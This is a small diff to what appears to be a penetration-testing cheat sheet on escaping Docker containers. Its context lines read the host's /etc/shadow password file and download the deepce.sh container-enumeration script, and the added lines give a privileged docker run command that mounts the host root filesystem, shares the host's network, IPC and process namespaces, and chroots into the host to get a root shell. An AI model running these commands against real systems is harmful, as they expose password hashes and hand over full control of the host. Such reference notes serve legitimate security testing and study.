@@ -89,3 +89,6 @@ cat /hostfs/etc/shadow
 ```
 curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o deepce.sh
 ```
+```
+docker run -it -v /:/mnt --net host --ipc host --pid host --privileged ubuntu bash -c "chroot /mnt bash"
+```
